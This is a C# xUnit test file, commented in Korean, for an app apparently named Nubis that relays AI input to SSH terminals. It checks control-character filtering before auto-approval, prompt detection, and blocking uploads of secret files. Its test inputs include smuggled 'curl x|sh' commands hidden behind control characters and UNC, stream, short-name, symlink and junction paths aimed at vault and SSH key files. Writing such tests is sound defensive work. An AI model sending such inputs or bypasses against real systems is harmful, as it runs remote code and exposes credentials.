using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Nubis;
using Xunit;

namespace Nubis.Tests;

public class McpFix2Tests
{
    private static bool ReadOnly(string _) => true;

    // ---------- send_to_terminal 제어 문자 ----------

    [Theory]
    [InlineData("ls -l", false)]
    [InlineData("ls\t-l", false)]               // 탭은 허용
    [InlineData("ls \u0015curl x|sh", true)]       // Ctrl-U 로 줄 지우고 바꾸기
    [InlineData("ls\u007f\u007fcurl x|sh", true)]    // DEL(백스페이스)
    [InlineData("ls \u001b[2Kcurl x", true)]       // ESC 시퀀스
    [InlineData("ls \u000fcurl", true)]            // Ctrl-O
    [InlineData("ls \u009bK", true)]               // C1 CSI
    [InlineData("ls\r", true)]
    [InlineData("한글 경로 ls", false)]
    public void 제어_문자_검사(string text, bool expected) =>
        Assert.Equal(expected, McpHelpers.HasControlChars(text));

    [Fact]
    public void 제어_문자가_있으면_읽기_전용이어도_자동_승인하지_않는다()
    {
        Assert.True(McpHelpers.CanAutoApproveTerminalInput(true, "ls -l", true, true, ReadOnly));
        Assert.True(McpHelpers.CanAutoApproveTerminalInput(true, "ls\t-l", true, true, ReadOnly));
        Assert.False(McpHelpers.CanAutoApproveTerminalInput(true, "ls \u0015curl x|sh", true, true, ReadOnly));
        Assert.False(McpHelpers.CanAutoApproveTerminalInput(true, "ls\u007fcurl", true, true, ReadOnly));
        Assert.False(McpHelpers.CanAutoApproveTerminalInput(true, "ls \u001b[Dcurl", true, true, ReadOnly));
        Assert.False(McpHelpers.CanAutoApproveTerminalInput(true, "ls \u0003", true, true, ReadOnly));
    }

    [Fact]
    public void 승인_창용_제어_문자_표시()
    {
        Assert.Equal("ls \\x15curl x|sh", McpHelpers.VisibleControlChars("ls \u0015curl x|sh"));
        Assert.Equal("a\\x7f\\x1b[2K", McpHelpers.VisibleControlChars("a\u007f\u001b[2K"));
        Assert.Equal("echo a\necho b\tc", McpHelpers.VisibleControlChars("echo a\r\necho b\tc"));
        Assert.Equal("a\\rb", McpHelpers.VisibleControlChars("a\rb"));
        Assert.Equal("x\\x9b", McpHelpers.VisibleControlChars("x\u009b"));
        Assert.Equal("ls \\u{202E}gpj.sh", McpHelpers.VisibleControlChars("ls \u202Egpj.sh"));
        Assert.Equal("평범한 명령 ls -l", McpHelpers.VisibleControlChars("평범한 명령 ls -l"));
    }

    // ---------- wait_for_output: 프롬프트 복귀를 기다릴지 ----------

    [Theory]
    [InlineData("user@web:~$ apt install -y nginx\nReading package lists...", true)]
    [InlineData("user@web:~$ sleep 30", true)]
    [InlineData("user@web:~$ sleep 30\n\n", true)]
    [InlineData("[root@db ~]# yum update\nLoading\n--> Running transaction check", true)]   // yum 의 --> 줄은 프롬프트가 아님
    [InlineData("user@web:~$ ls\nfile\nuser@web:~$ mysql -u root\nWelcome\nmysql> ", false)]
    [InlineData("user@web:~$ mysql\nmysql> select 1;\n+---+\n| 1 |\n+---+\nmysql>", false)]
    [InlineData("user@web:~$ python3\nPython 3.12.3\n>>> ", false)]
    [InlineData("user@web:~$ psql\npostgres=# ", false)]
    [InlineData("user@web:~$ sudo -i\n[sudo] password for user:", false)]
    [InlineData("user@web:~$ ssh db\nLast login: Mon\ndb-host$", false)]                  // 알아보지 못한 원격 프롬프트
    [InlineData("user@web:~$ apt upgrade\nDo you want to continue? [Y/n]", false)]
    [InlineData("❯ docker pull nginx\nPulling", false)]
    [InlineData("Downloading 50%", false)]
    public void 마지막_프롬프트_명령_줄이_지금_명령일_때만(string screen, bool expected) =>
        Assert.Equal(expected, McpHelpers.RunningCommandFromKnownPrompt(screen));

    [Fact]
    public void 실행_중인_명령의_출력()
    {
        var screen = "user@web:~$ ls\nListening old\nuser@web:~$ docker compose up\nweb  | starting\nweb  | Listening on 3000";
        var tail = McpHelpers.OutputAfterLastPromptCommand(screen);
        Assert.Equal("web  | starting\nweb  | Listening on 3000", tail);
        Assert.Equal(1, McpHelpers.CountMatches(tail!, "Listening", false));

        // 이전 명령의 출력은 포함하지 않는다
        var running = McpHelpers.OutputAfterLastPromptCommand("user@web:~$ cat a\nListening\nuser@web:~$ npm start\n> app@1.0 start");
        Assert.Equal(0, McpHelpers.CountMatches(running!, "Listening", false));

        Assert.Null(McpHelpers.OutputAfterLastPromptCommand("user@web:~$ make"));
        Assert.Null(McpHelpers.OutputAfterLastPromptCommand("no prompt here\nListening"));
        Assert.Null(McpHelpers.OutputAfterLastPromptCommand(""));
    }

    // ---------- 업로드 금지 경로: 우회 형태 ----------

    [Theory]
    [InlineData(@"\\localhost\c$\Users\a\.ssh\id_rsa")]
    [InlineData(@"\\127.0.0.1\share\vault.json")]
    [InlineData(@"\\server\admin$\x.txt")]        // 관리 공유
    [InlineData(@"\\server\d$\x.txt")]
    [InlineData(@"\\?\C:\Users\a\AppData\Roaming\Nubis\vault.json")]
    [InlineData(@"\\.\C:\Users\a\AppData\Roaming\Nubis\vault.json")]
    [InlineData(@"//server/share/file.txt")]
    [InlineData(@"D:\work\notes.txt:secret")]   // 대체 데이터 스트림
    public void 이_PC_를_가리키는_UNC_장치_경로와_대체_스트림은_거부(string path) =>
        Assert.NotNull(McpHelpers.BlockedUploadReason(path, @"C:\Users\a\AppData\Roaming\Nubis"));

    [Fact]
    public void 이_PC_이름으로_가리키는_UNC_는_거부() =>
        Assert.NotNull(McpHelpers.BlockedUploadReason($@"\\{Environment.MachineName}\share\a.txt", @"C:\Users\a\AppData\Roaming\Nubis"));

    // 다른 서버의 일반 공유(네트워크 드라이브)는 업로드할 수 있어야 한다
    [Fact]
    public void 다른_서버의_일반_공유는_허용() =>
        Assert.Null(McpHelpers.BlockedUploadReason(@"\\fileserver\team\report.txt", @"C:\Users\a\AppData\Roaming\Nubis"));

    [Fact]
    public void 짧은_이름_8_3_으로_데이터_폴더를_돌아가지_못한다()
    {
        var dir = Path.Combine(Path.GetTempPath(), "NubisFix2LongDataDirectoryName_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        try
        {
            var file = Path.Combine(dir, "vault.json");
            File.WriteAllText(file, "{}");
            Assert.NotNull(McpHelpers.BlockedUploadReason(file, dir));

            var shortFile = ShortPath(file);
            var shortDir = ShortPath(dir);
            // 짧은 이름 생성이 꺼진 볼륨이면 확인할 수 없다
            if (shortFile != null && !shortFile.Equals(file, StringComparison.OrdinalIgnoreCase))
                Assert.NotNull(McpHelpers.BlockedUploadReason(shortFile, dir));
            if (shortDir != null && !shortDir.Equals(dir, StringComparison.OrdinalIgnoreCase))
                Assert.NotNull(McpHelpers.BlockedUploadReason(file, shortDir));

            // 데이터 폴더 밖 같은 temp 의 다른 파일은 허용
            var other = Path.Combine(Path.GetTempPath(), "NubisFix2Other_" + Guid.NewGuid().ToString("N") + ".txt");
            File.WriteAllText(other, "x");
            try { Assert.Null(McpHelpers.BlockedUploadReason(other, dir)); }
            finally { File.Delete(other); }
        }
        finally { Directory.Delete(dir, true); }
    }

    [Fact]
    public void 심볼릭_링크로_데이터_폴더_파일을_가리키면_거부()
    {
        var dir = Path.Combine(Path.GetTempPath(), "NubisFix2Data_" + Guid.NewGuid().ToString("N"));
        var outside = Path.Combine(Path.GetTempPath(), "NubisFix2Out_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        Directory.CreateDirectory(outside);
        try
        {
            var secret = Path.Combine(dir, "hosts.json");
            File.WriteAllText(secret, "{}");
            var link = Path.Combine(outside, "notes.txt");
            try { File.CreateSymbolicLink(link, secret); }
            catch (Exception) { return; }   // 개발자 모드·관리자 권한이 없으면 링크를 만들 수 없다 — 확인 생략
            Assert.NotNull(McpHelpers.BlockedUploadReason(link, dir));
        }
        finally
        {
            Directory.Delete(outside, true);
            Directory.Delete(dir, true);
        }
    }

    [Fact]
    public void 정션으로_데이터_폴더를_가리키면_거부()
    {
        var dir = Path.Combine(Path.GetTempPath(), "NubisFix2Data_" + Guid.NewGuid().ToString("N"));
        var outside = Path.Combine(Path.GetTempPath(), "NubisFix2Out_" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        Directory.CreateDirectory(outside);
        var junction = Path.Combine(outside, "j");
        try
        {
            File.WriteAllText(Path.Combine(dir, "vault.json"), "{}");
            // 정션은 관리자 권한 없이 만들 수 있다 (mklink /J)
            using (var p = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe", $"/c mklink /J \"{junction}\" \"{dir}\"")
                   { CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true }))
                p!.WaitForExit(10000);
            if (!Directory.Exists(junction)) return;
            Assert.NotNull(McpHelpers.BlockedUploadReason(Path.Combine(junction, "vault.json"), dir));
            Assert.NotNull(McpHelpers.BlockedUploadReason(junction, dir));
        }
        finally
        {
            try { if (Directory.Exists(junction)) Directory.Delete(junction); } catch { }
            Directory.Delete(outside, true);
            Directory.Delete(dir, true);
        }
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern uint GetShortPathNameW(string longPath, StringBuilder shortPath, uint bufferLength);

    private static string? ShortPath(string path)
    {
        var sb = new StringBuilder(1024);
        var n = GetShortPathNameW(path, sb, (uint)sb.Capacity);
        return n == 0 || n > sb.Capacity ? null : sb.ToString();
    }
}
